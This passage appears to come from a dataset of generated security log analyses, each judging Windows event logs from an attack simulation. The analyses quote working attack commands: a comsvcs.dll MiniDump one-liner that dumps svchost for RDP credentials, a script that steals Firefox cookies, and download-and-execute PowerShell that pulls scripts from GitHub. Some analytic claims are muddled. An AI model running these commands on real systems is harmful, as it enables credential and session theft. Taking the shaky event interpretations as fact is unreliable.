- **Contact incident response teams** to perform a forensic investigation on ""Server002"" for further compromise indicators and follow appropriate incident handling procedures.

### Resolution:
Based on the evidence of unauthorized access attempts aimed at extracting sensitive registry data, I would categorize the activity as **MALICIOUS**. Immediate action to investigate, contain, and remediate the incident is necessary."
Registry parse with pypykatz,"After reviewing the provided logs, here is a detailed analysis:

### 1. Application Log:
- The logs predominantly record the installation of Python 3.10.4, including `pip` and updates to the system path. The `MsiInstaller` events indicate successful installation, and there's no evidence of installation errors or unexpected behavior.

### 2. Sysmon Log:
- **Process Creation Events**:
  - `msiexec.exe` (for MSI package installations) and `python.exe` (Python interpreter) are operating with expected command-line parameters. 
  - Multiple instances of system processes like `cmd.exe`, `conhost.exe`, and `powershell.exe` are seen, but they seem associated with normal operation and user interactions.

- **Potentially Suspicious Activity**:
  - Short time frame between events involving PowerShell and the download of `python-3.10.4-amd64.exe` from an external web source using `invoke-webrequest` followed by its execution.
  - Observed command: `powershell.exe & {New-Item -Type Directory ""C:\Users\ADMIN_~1\AppData\Local\Temp\...\\""...;}` indicates the downloading and silent execution of a Python installer. 
  - `cmd.exe` is executing a script from a temporary path in what appears to be a potentially unconventional manner.

### 3. Windows PowerShell Log:
- Logs detail the execution of PowerShell command to download a Python installer and execute it. This represents an automated process running with PowerShell scripting capabilities to download and run an executable.

### 4. Security and System Logs:
- No relevant entries provided to indicate other harmful configurations or tampering.

### Assessment:
There are elements within the logs that could imply suspicious behavior:
- The automated download and execution of software using PowerShell could be legitimate but is generally a technique also used in malware distribution vectors.
- The use of a Temp directory and PowerShell for script-based activity raises potential red flags.

### Resolution:
**SUSPICIOUS**
- While there is no direct evidence of malicious activity, certain automated actions raise questions about whether they are part of a legitimate admin task or potentially unauthorized scripting.

### Guidance on How to Proceed:
1. Verify with the system administrator or user if the installations were authorized and if there was a legitimate reason for using PowerShell to download and install Python.
2. Conduct network traffic analysis to verify the legitimacy of external connections made during the script execution.
3. Evaluate the legitimacy of script locations and contents within the Temp paths used.
4. Implement tighter monitoring and logging for similar activities, particularly scripts or processes executing through PowerShell.
5. Consider additional controls on external downloads executed via PowerShell to prevent unauthorized software installations or malware introduction."
Create Volume Shadow Copy with diskshadow,"Upon analyzing the provided logs, the following observations and conclusions have been made:

1. **Time Change Events**: 
   - Event ID 4616 in the Security log and Event ID 1 in the System log show multiple occurrences of system time changes. Changing system time is an action that might be used by malicious actors to manipulate logs or time-sensitive applications. However, it's not inherently malicious by itself and could be administrative or due to synchronization issues.

2. **Privilege Assignment**: 
   - Event ID 4672 in the Security log shows the assignment of a set of privileges (SeSecurityPrivilege, SeBackupPrivilege, etc.) to the user ""admin_test"". These privileges include high-level permissions such as debug and take ownership privileges which can be suspicious if unauthorized. This could indicate privilege escalation.

3. **User Logon and Session Events**:
   - Event ID 4624 in the Security log indicates a network logon (LogonType 3) by ""admin_test"" using NTLM authentication. The use of NTLM instead of more secure authentication methods in a modern environment can be considered less secure.
   - The presence of Event ID 4634, showing a logoff for the same user shortly before or after logon in rapid succession, could point to automated or scripted logon if repeated continuously.

4. **Command-line and Process Execution**:
   - In the Sysmon logs, there are multiple executions of processes like `wevtutil.exe`, `conhost.exe`, `cmd.exe`, `diskshadow.exe` related to user ""admin_test"". Notably, `cmd.exe` executed a command (`mkdir c:\script & diskshadow.exe /s ...`) with potential to create directories and script execution. While the use of `cmd.exe` itself is benign, using `diskshadow.exe` can be leveraged for VSS (Volume Shadow Copy) attacks to access and exfiltrate files.

5. **Task Scheduler and Windows Update**:
   - There are scheduled tasks and updates running (`wuauclt.exe`) which is standard for keeping systems up to date, along with the updates to Defender showing expected anti-malware activity.

6. **Repeated Access Attempts**:
   - Event ID 5379 entries show unsuccessful credential read attempts with ReturnCode `3221226021` which translates to `STATUS_NO_SUCH_LOGON_SESSION`. This might imply an attempt to access credentials unsuccessfully, which could be probing or unsuccessful malicious activity.

**Assessment and Resolution**:

Given these observations, several red flags arise, particularly regarding unauthorized privilege elevations, use of administrative and process utilities that could potentially indicate malicious intent, and suspect command-line execution scenarios.

Final Resolution: **SUSPICIOUS**
- The activities observed suggest potential misuse of administrative capabilities with unusual process execution patterns necessitating further investigation.
- Additional monitoring on user ""admin_test"" should be implemented.
- Reviewing process creation details, inspecting for unauthorized time changes, and potentially employing more secure authentication mechanisms to dismantle NTLM reliance are suggested.

Further investigation into the context and legitimacy of user actions and explicit tracking in real-time would aid in appropriately reassessing any threats."
ESXi - Brute Force Until Account Lockout,"## Detailed Analysis:

### 1. Overview of Logs:
The logs presented include Sysmon logs, Windows PowerShell logs, an Application log, and Security logs from a Windows machine labeled as Server002. The time frame covers events around October 24, 2024. 

### 2. Potentially Suspicious or Anomalous Behavior:
- **Frequent PowerShell and External File Execution:**
  - There is a noticeable pattern of PowerShell execution using plink.exe from a temporary location, ""\\Externalfiles\\plink.exe"", attempting SSH connections as root. The command line involved suggests potential unauthorized remote command execution or an attempt to establish foreign control.

- **Events Related to Account Activities:**
  - There are multiple entries involving attempts or retrievals that failed with a Return Code ""3221226021"". These could imply trying to access create/use accounts or credentials unsuccessfully. The target names include various user types and service URIs, which might be an automated attempt to extend access or change configurations.

- **Usage of Debugging Privileges:**
  - Multiple Security audit logs indicate elevated privilege assignments (EventID: 4672) to SYSTEM accounts, specifically privileges like SeDebugPrivilege, which are typically only necessary for administrative level actions and can be used for malicious attacks if misused.

### 3. Indicators of Malicious Activity:
- The execution of a PowerShell script using 'plink.exe' for SSH connections with a hard-coded password is a strong indication of potential malicious activity. This behavior is atypical for legitimate system operations and suggests the possibility of an attempt to establish persistence, lateral movement, or exfiltration data/commands.
  
- The Sysmon logs showing processes initiated by PowerShell scripts executing plink.exe further ascertain the likelihood of this being unauthorized activity, particularly from a user profile setup on the Server002 machine using credentials labeled ""admin_test"".

### 4. Other Observations:
- **Scheduled and Automated Tasks:**
  - The 'taskhostw.exe' involved events indicate potential background tasks or scheduled tasks trying to perform actions usually aligned with script automation or maintenance activities.

### Guidance on How to Proceed:
Given these observations, the findings point toward probable malicious activity due to:
- The recurrent attempt to execute unauthorized SSH commands.
- The usage of high privileges inappropriate for the accessed processes.

### Final Resolution:
- **Resolution: MALICIOUS** 
  - The activities observed are definitive of malicious behavior, particularly with the use of PowerShell to run external tools like plink.exe from non-standard paths, which is a classic sign of compromise (attack tools usage).

### Recommended Actions:
1. **Immediate Quarantine**: The affected machine should be isolated from the network to prevent further unauthorized access or potential lateral spread.
2. **Credential Audit**: Review and reset credentials, especially for 'admin_test' and any accounts that might have been exposed or tampered with.
3. **Script and Process Review**: Examine scripts and running processes initiated by or during the timeframe of logs for further unauthorized activities.
4. **Enhanced Monitoring**: Implement more robust monitoring around PowerShell executions and command execution over network protocols.
5. **Incident Response Engagement**: Engage the incident response team to conduct a comprehensive investigation and remediation plan. 

This analysis should be considered the beginning of a deeper investigation to ensure all malicious activities are identified and remediated precisely."
WinPwn - powershellsensitive,"### Analysis Summary:

1. **Application Log Analysis:**
   - The application logs primarily show standard entries related to Windows Defender being on and the Software Protection Platform Service reporting its state. No anomalies or indications of malicious activities are observed in this part of the logs.

2. **System Log Analysis:**
   - The system logs indicate regular updates and time synchronization activities. No suspicious behavior or anomalies are present. The events related to the `svchost.exe` during time adjustments are routine and align with typical system operations.

3. **Security Log Analysis:**
   - The security logs reflect a time change by the `svchost.exe` process running under the LOCAL SERVICE account (`S-1-5-19`), which corresponds to time synchronization activities. This is generally benign unless there are additional contextual indicators of tampering, which are absent here.

4. **Windows PowerShell Log Analysis:**
   - The PowerShell logs exhibit concerning behavior: PowerShell execution involves downloading and executing a script from a GitHub URL. The specific commands suggest potential unauthorized or malicious activity triggered via PowerShell.
   - The URL pattern and usage of `Invoke-Expression` (`iex`) with `net.webclient` are common indicators of malicious scripts, often used in fileless malware attacks or loading malicious scripts directly from the internet.

5. **Sysmon Log Analysis:**
   - The Sysmon logs report various executions of system binaries, including `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and others by the user `SERVER002\\admin_test`. However, these appear primarily to be routine processes.
   - The presence of `hostname.exe` in typical directories indicates minor execution details rather than being overtly anomalous on their own.
   - The critical part is the concurrent execution of PowerShell, directed to externally sourced scripts, as noted corroboratively in the PowerShell log.

### Conclusion:
Based on the PowerShell log entries, there is strong evidence of potentially malicious activity due to the execution of a script sourced from an external URL. This activity is unauthenticated and aligns with practices employed in common cyber threats, particularly concerning lateral movement or reconnaissance scripts.

### Resolution: MALICIOUS

Given the evidence of PowerShell executing scripts sourced from an unfamiliar GitHub repository without explicit user consent, it promptly flags a concern with a high likelihood of being malicious. It is recommended to:
- Immediately isolate the affected system for detailed forensic analysis.
- Investigate network traffic for additional suspicious activities or data exfiltration.
- Review and adjust system and network security policies to block similar activities.
- Ensure users are informed and aware of potential phishing or unauthorized scripting activities."
DCSync (Active Directory),"Upon reviewing the event logs provided, here's a detailed analysis and assessment of potential threats or risks:

### Suspicious or Anomalous Behavior:

1. **Unusual Command Execution:**
   - The Sysmon logs show the execution of a command script using `cmd.exe` with the specific command `""C:\Windows\system32\cmd.exe"" /c echo %%tmp%%\script\x64\script.exe`. This behavior is unusual as it involves echoing a path, which doesn't seem to accomplish any typical administrative task. Such activity can be indicative of an attempt to obfuscate or prepare for further execution steps.

2. **PowerShell Execution:**
   - The parent process for the above cmd execution is PowerShell with a command attempting to check for the presence of a script at a temporary location, which could be a tactic used by attackers to ensure the payload exists before attempting execution.

3. **Repeated Use of `wevtutil.exe`:**
   - `wevtutil.exe` is seen multiple times in the logs. While this tool can be used for legitimate administrative tasks like querying or clearing event logs, repeated and rapid successive usage could be associated with adversaries attempting to clear or tamper with event logs to cover their tracks.

4. **High-Integrity Level Operations:**
   - The logs reveal several processes running at a high integrity level, such as `cmd.exe`, `hostname.exe`, and `whoami.exe`, all under the context of the user `SERVER002\\admin_test`. While having these programs run isn't inherently malicious, their context, command line parameters, and rapid succession suggest potential misuse.

5. **Malware Protection Signature Update Stub:**
   - There are entries related to `MpSigStub.exe`, which is a legitimate process for updating malware definitions. Its presence is part of normal system operations for Windows Defender updates.

### Assessment:

- The execution patterns seen, particularly the use of PowerShell scripts and command-line operations, suggest a deviation from standard practices that could indicate suspicious activity.
- The multiple instances where `wevtutil.exe` is executed could indicate an attempt to tamper with event logs, potentially suggesting malicious intent.
- Given these indicators, there is a potential risk of compromise, possibly involving script execution, evasion techniques, and attempts to manipulate system logs.

### Resolution:

Based on the indicators found, the appropriate resolution for these logs is:

**SUSPICIOUS**

### Guidance on How to Proceed:

1. **Deeper Investigation:**
   - Conduct a deeper forensic analysis focusing on the context and source of the suspicious script (`%%tmp%%\script\x64\script.exe`). Verify its presence and analyze its content.
   - Investigate any external connections or data exfiltration associated with the time stamps of these events.
   
2. **Audit and Monitoring:**
   - Enable enhanced logging, particularly for PowerShell and command line activities, to capture any repeated or anomalous behavior.
   - Implement strict monitoring for the repeated use of `wevtutil.exe` and other sensitive system utilities.

3. **User and Access Review:**
   - Review recent changes to user privileges and any new administrative accounts that might have been created.
   - Perform a thorough review of access logs for `SERVER002\\admin_test` and other users with high-privilege access.

4. **Security Posture Enhancement:**
   - Ensure the Endpoint Protection is fully operational and up to date.
   - Consider implementing enterprise-level security solutions for enhanced detection and response capabilities. 

Immediate actions to address potential misconfigurations or weaknesses in current security setup are recommended, along with a reassessment of security protocols."
WebBrowserPassView - Credentials from Browser,"### Analysis of the Windows Event Logs:

1. **Security Log Analysis:**
   - **EventID 5379**: Multiple entries with return codes `3221225567` and `3221226021` suggest failed attempts, possibly credential validation failures. Importantly, the mention of `MicrosoftAccount` and `WindowsLive` indicates attempts related to account information, which is suspect.
   - **EventID 4624** and **4672**: These indicate logons and privilege assignments to the `SYSTEM` account. Logon type 5 pertains to a service logon, which is typical for SYSTEM operations but shows elevated privileges.
   - **EventID 4798**: Enquiries for group information multiple times for accounts like `Administrator`, `admin_test`, and others. Excessive querying can be suspicious if not justified by regular administration tasks.

2. **Sysmon Log Analysis:**
   - **EventID 1 and 5**: Notably, a process identified as `script.exe` from NirSoft, categorized as a ""Web Browser Password Viewer,"" was executed via PowerShell. This indicates potential unauthorized data access or exfiltration attempts. The execution chain involving `PowerShell` and another executable in a Temp location is a common tactic in malicious activities.
   - **Multiple Process Executions**: The execution of Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) is typically benign unless part of a Trojan masquerading strategy, but does not exhibit direct malfeasance in this context.

3. **PowerShell Log Analysis:**
   - **EventID 600**: Repeated startup of PowerShell sessions to execute a potentially malicious script (`script.exe`) is noted. The use of `Start-Process` and `Stop-Process` with a ""sleep"" function suggests obfuscation tactics in command execution, potentially indicating advanced persistence mechanisms.

4. **Application Log Analysis:**
   - **Edge Update Events**: Entries indicate normal service operations for Edge Update, e.g., stopping, which is generally benign unless coinciding with other signs of compromise.

### Assessment:

- The use of tools like `script.exe` to extract browser passwords, executed through PowerShell, is a significant indicator of malicious activity.
- The failed credential attempts, particularly associated with external account services (`MicrosoftAccount`, `WindowsLive`), are considered as attempts at unauthorized access or enumeration.
- Combined, these behaviors deviate from typical operations, indicating potential compromise.

### Resolution:

- **MALICIOUS**: The logs contain indicators of compromise, including unauthorized data access attempts and unusual script execution, confirming malicious activity.

### Guidance:

1. **Immediate Actions**:
   - Isolate the affected system to prevent further unauthorized access.
   - Initiate a forensic investigation to determine the extent of data accessed and exfiltrated.
   - Change all critical account passwords and enforce multi-factor authentication immediately.

2. **Long-Term Measures**:
   - Conduct a full security audit of user accounts and permissions on the network.
   - Implement stricter PowerShell execution policies and monitor scripts executed via PowerShell.
   - Review firewall and network security settings to prevent unauthorized outbound connections.

3. **User Awareness**:
   - Inform users about identifying phishing attempts and credential security measures.
   - Regular security training and phishing simulations for users can reduce future exposure.

This analysis indicates a critical situation warranting comprehensive incident response and remediation measures."
Password Spray Microsoft Online Accounts with MSOLSpray (Azure-O365),"Upon reviewing the provided logs across various channels, several entries point towards potentially malicious activity:

1. **PowerShell Activity:**
   - There are PowerShell commands executed using `Invoke-MSOLSpray`, which is a script typically used for password spraying against Microsoft Online (MSOL) services, indicating an attempt to gain unauthorized access. The execution was commanded from a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp`) which is uncommon for legitimate administrative tasks and could be an attempt to conceal malicious activity.

2. **Suspicious Process Execution:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are observed being executed by a user 'SERVER002\admin_test' within a short time span. While `wevtutil.exe` is a legitimate utility used for managing Windows Event logs, its frequent use alongside `conhost.exe`, which is a console application hosting infrastructure, without clear context could suggest attempts to manipulate logs or administer the system via command-line interfaces.

3. **Sysmon Logs & Elevated Privileges:**
   - Log entries show several processes with a high integrity level executed by 'SERVER002\admin_test', indicating actions performed with elevated privileges, which might be part of an unauthorized privilege escalation or lateral movement attempt.

4. **Application Log:**
   - The consistent presence of Microsoft Edge Update activities doesn't raise immediate concerns by itself, but might serve as a mask for other operations or simply be part of routine software maintenance.

Given these observations, the activity seems to fit a pattern consistent with a potential targeted attack or security breach attempt due to credential spraying, possibly to gain unauthorized access to sensitive data or spread laterally within the network. The absence of security event logs makes it imperative to focus on the observed behavior patterns and pre-emptively address potential risks.

**Conclusion: SUSPICIOUS**

The logs exhibit indicators of potentially malicious activities, primarily concerned with credential attacks via PowerShell and abnormal system command executions. Further investigation is warranted to determine the intent and scope of these actions.

**Guidance on How to Proceed:**
- Conduct a detailed forensic analysis focusing on PowerShell script sources, specifically `MSOLSpray.ps1`, to determine how it was introduced and by whom.
- Review access logs for 'SERVER002\admin_test' and overall usage of temporary directories.
- Implement tighter monitoring on further script executions and command line activities across critical systems.
- Proceed with resetting passwords and credentials potentially exposed by the observed activities.
- Consider network-wide inspection for any potential lateral movements or internal threats.

Strengthening user access controls and ensuring that security patches are up-to-date will further reduce the risk of exploitation."
WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS,"Upon reviewing the provided Windows event logs, several indicators of potentially malicious activity have been identified. Below is a detailed analysis structured according to log type:

### 1. **Application Log Analysis**:
- The logs indicate normal operations for the Software Protection Platform (SPP) and edgeupdate services, with no immediate signs of malware or malicious activity.

### 2. **System Log Analysis**:
- No unusual changes in the system time were found apart from expected events from the Windows Time Service. There is nothing immediately suspicious concerning timezone or system time changes.

### 3. **Security Log Analysis**:
- **Event ID 4672**: The user `admin_test` is being granted a series of privileges, including `SeDebugPrivilege`, `SeLoadDriverPrivilege`, and `SeImpersonatePrivilege`. While privileged accounts may have these by default, all of them are sensitive, especially `SeDebugPrivilege`, which could be exploited if compromised to execute arbitrary code.

- **Event ID 4624**: The network logon of `admin_test` from a remote machine using NTLM authentication could be typical, but pairing this with privileged assignment requires further verification that this activity was expected and authorized.

- **Event ID 4616**: Logs indicating a time change made by `LOCAL SERVICE` using `svchost.exe`. Although usually benign, if unexpected, it could be worth checking as chrono-manipulation is occasionally used in certain attack scenarios.

### 4. **Windows PowerShell Log Analysis**:
- Indications of malicious PowerShell command execution:
  - The command involves downloading and executing a script from a remote location using PowerShell (`Invoke-Internalmonologue.ps1`). This script is being fetched from GitHub via `iex(new-object net.webclient).downloadstring()`, a classic indicator of potential malicious behavior when used to import scripts directly from a network resource. This execution is a significant red flag for PowerShell abuse and possible remote code execution.

### 5. **Sysmon Log Analysis**:
- **Process Execution**:
  - Executions of `hostname.exe` and `whoami.exe` appear benign if used during a typical administrative session or diagnostics.
  - **PowerShell Execution** (`PowerShell.exe` with remote script execution) is flagged under Sysmon as per the PowerShell logs, confirming suspicious activity.

### Conclusion:
The evidence includes unauthorized script execution via PowerShell which suggests malicious activity. Specifically, the execution of a PowerShell script from an external source signifies a high probability of compromise, given the context and method used to invoke the script. 

### Resolution:
- **MALICIOUS**: The logs contain activity strongly indicative of compromised security involving unauthorized script execution over PowerShell, likely targeted towards persistent access or gaining credentials.

### Guidance on How to Proceed:
- Isolate the affected system to prevent any potential lateral movement or data exfiltration.
- Conduct a full malware scan and forensic analysis of the affected host for further indicators of compromise.
- Analyze the downloaded script (`Invoke-Internalmonologue.ps1`) for its intent and any payloads it may deploy.
- Assess and reinforce the security posture by reviewing access controls, especially for high-privileged accounts like `admin_test`.
- Implement Network Security Monitoring (NSM) to detect live threats and potentially block command and control communications, if observed.
- Provide security awareness training on recognizing signs of compromise and best practices for handling privileged accounts."
WinPwn - sensitivefiles,"## Detailed Analysis of the Provided Logs

Analyzing the provided event logs from the Windows host, a few entries stand out that indicate possible anomalous or suspicious activities which may warrant further investigation for potential malicious behavior.

### Key Observations:

1. **PowerShell Activity:**
   - PowerShell is executed with a command that downloads a script from a GitHub repository (`https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`) and executes it. This kind of behavior is generally considered suspicious, as it involves downloading and executing potentially unauthorized scripts from external sources.
   - The use of `iex(new-object net.webclient).downloadstring` suggests the execution of a script directly from the internet without user intervention, which is a common technique used by attackers to deploy malicious code.

2. **Application and Sysmon Logs:**
   - Process execution entries in the Sysmon logs show multiple instances of `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe` operations. These are legitimate processes related to Microsoft Edge updates. However, their frequency and variety of operations should be verified to ensure they align with normal update behavior.
   - Frequent stopping of services by `edgeupdate` is logged, but without further context, it appears to be a regular behavior related to update processes.

3. **Security and System Logs:**
   - System time changes are logged (`EventID 4616`), which can sometimes be indicative of an attacker attempting to manipulate log times. However, these entries show a very short time correction which may not necessarily be suspicious.

4. **General System Integrity:**
   - The consistent usage of `NT AUTHORITY\SYSTEM` for the Edge Update processes and high integrity levels across critical executable processes suggest expected system behavior with proper permissions. However, this could be exploited if the initial payload execution is considered malicious.

### Assessment:

Given the PowerShell execution which directly downloads and executes a script from the internet, this activity is highly suspicious. This kind of behavior is often associated with malware deployment or an attacker attempting to execute unauthorized code on the host. The presence of `iex(new-object net.webclient).downloadstring` is particularly indicative of possibly compromising actions.

### Resolution:

- **SUSPICIOUS**: The activities logged, especially concerning the PowerShell execution, are suspicious and merit further investigation to determine the legitimacy of the downloaded script and to ensure no system compromise has occurred. Immediate actions should include:
  - **Review and verify** the script being downloaded from the GitHub repository.
  - **Check for potential signs** of system compromise or further unauthorized behavior resulting from the script execution.
  - Consider isolating the machine from the network until a thorough investigation is completed to ensure containment.
  
Note: While Edge-related processes can be frequent, their execution context should also be reviewed, and any unexplained behavior should be addressed to rule out misuse in conjunction with the suspicious PowerShell activity."
Request All Tickets via PowerShell,"Based on the analysis of the provided Windows event logs, several elements stand out that may indicate potentially suspicious activity:

1. **Frequent Execution of Command-line Utilities**: 
   - Multiple instances of `conhost.exe`, `wevtutil.exe`, `powershell.exe`, and `setspn.exe` were executed in quick succession by the same user (`SERVER002\\admin_test`). While the context and frequency of such executions are often normal in a managed or administrative context, in a short time frame, they might raise a flag for potential misuse, especially when seen with PowerShell scripts.

2. **PowerShell Activity**:
   - The use of PowerShell with complex command-line arguments such as creating Kerberos tokens (`New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken`) could be indicative of advanced operations often seen in lateral movement or privilege escalation attacks. This includes scripting that interacts with Kerberos, potentially for unauthorized service principal name (SPN) investigations.

3. **Microsoft Edge Update Activity**:
   - The presence of multiple `MicrosoftEdgeUpdate.exe` executions related to various update checks and services could indicate normal update processes. However, it should be confirmed that these processes are legitimate updates and not disguised malicious activities. The usage in temporary directories is somewhat unusual and could warrant further scrutiny.

4. **Service and Application Stops**:
   - The `edgeupdate` service stopped multiple times, which could be standard logging but could also mean someone disrupted an update process intentionally.

5. **Process Privilege**:
   - Many of the executed processes are operating with System or High integrity level, which aligns them with potential privileged tasks; this might suggest overheating - where elevated privileges may be at risk if not being operated under expected conditions.

**Assessment**:
- **SUSPICIOUS**: The activity captured in the logs has several red flags that warrant further investigation. Although no outright malicious actions have been confirmed (e.g., no known malware signatures or direct indicators of compromise), the context of the logging behavior – particularly around the PowerShell commands and replication within diverse high-privileged processes – indicates a deeper examination is necessary.

**Guidance**:
1. **Review User Activity**: Investigate `SERVER002\\admin_test` for legitimate administrative activity. Correlate these events with authorized changes, updates, or security checks.
2. **Cross Verify with Known Updates**: Ensure the Microsoft Edge updates correspond to an official update window. Compare hashes and verify via trusted sources if necessary.
3. **Network Analysis**: Check for suspicious outbound connections or pair these logs with network data for unusual data exfiltration or command-and-control activities.
4. **Check for Persistence Mechanisms**: Due to potential advanced scripting observed, ensure no persistence mechanisms were established (scheduled tasks, surreptitious services).
5. **Use Endpoint Detection and Response (EDR) Tools**: If available, employ EDR tools to look into these PowerShell activities for deeper insights on parameter usage and script execution trails.

Dump svchost.exe to gather RDP credentials,"Based on the provided log entries, let's analyze the data to identify any suspicious activities or anomalies.

### Windows PowerShell Log Analysis
The PowerShell logs indicate the execution of multiple PowerShell commands with the following command:
```powershell
powershell.exe & {$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore) 
if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id } 
C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full}
```
This command is checking for active Remote Desktop Protocol (RDP) connections on port 3389, identifying the owning process, and attempting to create a memory dump of that process (`svchost`) using `rundll32.exe` and `comsvcs.dll`. This behavior is suspicious as creating a memory dump of a system process like `svchost.exe` could potentially be a precursor to a malicious activity such as credential theft or system reconnaissance.

### Security Log Analysis
There are several notable entries:
- **EventID 4634**: A user (`admin_test`) logged off, logon type 3 indicates it was a network logon.
- **EventID 4672**: The same user gained privileged rights, indicating some level of privilege escalation.
- **EventID 4624**: Indicates a successful network logon for the user `admin_test`, using NTLM authentication method from a remote workstation `DESKTOP-3HL5B2P`, and no elevated token was used which seems consistent with normal operation.

### Sysmon Log Analysis
The Sysmon logs show a series of processes executed by the user `admin_test`:
- Execution of several utility binaries like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and multiple instances of `PowerShell`. The combination of these utilities typically points to system enumeration and information gathering.
- The execution of `rundll32.exe` in tandem with the PowerShell command mentioned earlier confirms the attempt to create a dump of a running process.

### Conclusion
The collected evidence from the PowerShell, Security, and Sysmon logs indicate potentially malicious activity:
- An attempt to perform a memory dump of a critical system process using a PowerShell script could signal a compromise, typically for exfiltrating credential material or sensitive information.
- Privilege escalation activities performed by user `admin_test` reinforce the suspicion of a potential compromise scenario.

### Resolution
Given these findings, the assessment leads to the resolution:
- **MALICIOUS**: The combination of memory dump creation of `svchost.exe`, privilege escalation events, and network-based logons suggest a high likelihood of malicious activity.

### Guidance
- Immediately isolate the affected host to prevent further potential data exfiltration or lateral movement.
- Conduct a full forensic analysis of the system for any evidence of malicious software, unauthorized changes, or data exposure.
- Review user activity logs and evaluate any other systems that might have been accessed by the compromised user account.
- Consider resetting the affected user's credentials and applying additional security controls such as network segmentation, enhanced monitoring, and multi-factor authentication to protect sensitive resources."
Export Root Certificate with Export-Certificate,"### Detailed Analysis:

#### Suspicious or Anomalous Behavior:

1. **Process Execution and Command-Line Arguments:**
   - **PowerShell Execution:**
     - **Event ID: 17979** (Sysmon log) indicates the execution of `powershell.exe` with a command creating a self-signed certificate. 
     - Command line argument: `""powershell.exe"" & {$cert = New-SelfSignedCertificate -DnsName file.com -CertStoreLocation cert:\\LocalMachine\\My, Set-Location Cert:\\LocalMachine\\My, Export-Certificate -Type CERT -Cert Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath $env:Temp\\file.cer}`
     - The use of `New-SelfSignedCertificate` and `Export-Certificate` within a user directory is anomalous without a clear associated necessity or documented change procedure. Certificates managed in user directories might bypass standard security controls if not monitored appropriately.

   - **Time Change:**
     - **Event IDs: 30349 and 30350** (Security log) show a time discrepancy, indicating the system time was rolled back. This is typically done to cover tracks by modifying timestamps of logs and files that can be indicative of an intrusion.

2. **Privilege Escalation:**
   - **Event ID: 4672** (Security log) shows a set of high privileges being assigned to ` admin_test `, including privileges like `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. While `admin_test` is an admin, granting such privileges in a steady state should be rare and audited.

3. **Process Creation:**
   - The creation of standard Windows processes (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`) by `SERVER002\\admin_test` without additional context or operation is generally benign but should be correlated with user activity for clarity.

   - **System Process:**
     - **Event ID: 17981** (Sysmon log) shows `svchost.exe` running with SYSTEM privileges which is expected in normal circumstances but should be flagged and correlated with user operations and system state changes like the time set event.

4. **Network Activity:**
   - **Event ID: 4624** (Security log) captures a network logon using `NTLM` authentication package from an IPv6 address. Coupling network logon events to potential lateral movement that could precede the credential actions seen is worthwhile.

#### Assessment:
- **Threat/Risk Identified:**
  - The use of PowerShell to create and export a self-signed certificate is very suspicious. This kind of activity can be part of SSL certificate King-Of-The-Hill attacks or Man-in-the-middle, and malware obfuscation using secure channels.
  - The system time change could indicate an attempt to evade detection by altering log or timestamp data.
  - Assigned privileges are sensitive and should be validated against user need or ongoing technology projects.

#### Guidance:
1. **Immediate Steps:**
   - Investigate the rationale behind the PowerShell script execution, ensuring the legitimacy of the user and purpose.
   - Audit the admin_test account activities to ensure it aligns with authorized operations.
   - Investigate the need for a high-privilege assignment for `admin_test` and evaluate any changes in user roles recently.
   - Validate time change reason from internal change management tickets or related jobs.

2. **Monitoring & Prevention:**
   - Enhance monitoring on PowerShell execution logs and employ AMSI (Antimalware Scan Interface) for better insights.
   - Alert on high-risk privileges being assigned and time change events to track potential abuse.

### Resolution: 
- **Resolution: SUSPICIOUS**

In summary, the logs indicate potentially malicious activities or at least abuses of powerful system features. Further investigation is needed to determine if these actions were legitimate or if a compromise could be in progress, especially due to the suspicious use of PowerShell and privilege escalations observed."
Steal Firefox Cookies (Windows),"Based on the analysis of the provided Sysmon logs and PowerShell logs, the following findings can be established:

### Anomalous and Suspicious Activities:

1. **Use of PowerShell with Unusual Arguments:**
   - A PowerShell script is executing a command that stops the Firefox browser process and accesses cookies from the Firefox profile using SQLite:
     - Command: `""powershell.exe"" & {stop-process -name \""firefox\"" -force -erroraction silentlycontinue, $CookieDBLocation = get-childitem -path \""$env:appdata\\Mozilla\\Firefox\\Profiles\\*\\cookies.sqlite\"" ...}`
   - The script is utilizing SQLite tools to extract cookie information from the Firefox browser and saving the output to a file in a temporary directory: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\dataFirefoxCookies.txt`.
   - The execution of such a script is suspicious because extracting cookies from a web browser, particularly in a hidden and indirect manner, can indicate malicious intent such as credential stealing or session hijacking.

2. **Frequent usage of `wevtutil.exe` and `conhost.exe`:**
   - The user `SERVER002\\admin_test` has spawned `wevtutil.exe` multiple times. While `wevtutil.exe` is a legitimate utility to manage Windows event logs, its repeated use without a clear reason may indicate an attempt to clear or manage logs maliciously.
   - This activity is followed by the frequent appearance of `conhost.exe`, which can be related to the console window initiated by command-line operations, but regular appearances of these processes can also signify the cover-up of malicious activities.

3. **Execution of Commands with High Integrity Level:**
   - The PowerShell and other shell commands are executed under a high integrity level, which suggests elevated permissions. This could pose a risk if the executing script is malicious as it would have broader access and control over the system resources.

### Threats or Risks Identified:
- The primary concern here is an indicative behavior of potential data exfiltration or credential stealing activities due to the extraction of browser cookies.
- The script, constructed to interact with Firefox cookie storage, is potentially a part of a broader scheme to hijack user sessions or extract sensitive browsing data.
- The repeated execution of `wevtutil.exe` might indicate attempts to manipulate event logs to cover up tracks.

### Recommendations:
- **Immediate further investigation** is necessary, focusing on the context in which these PowerShell scripts are running, identifying who initiated these processes, and validating whether they conform to expected activities in your network environment.
- **Review and monitor user account privileges**, especially the `admin_test` account across the network, to ensure no unauthorized access or privilege escalation has occurred.
- **Patch and secure PowerShell** so that script execution is monitored and restricted to known scripts.
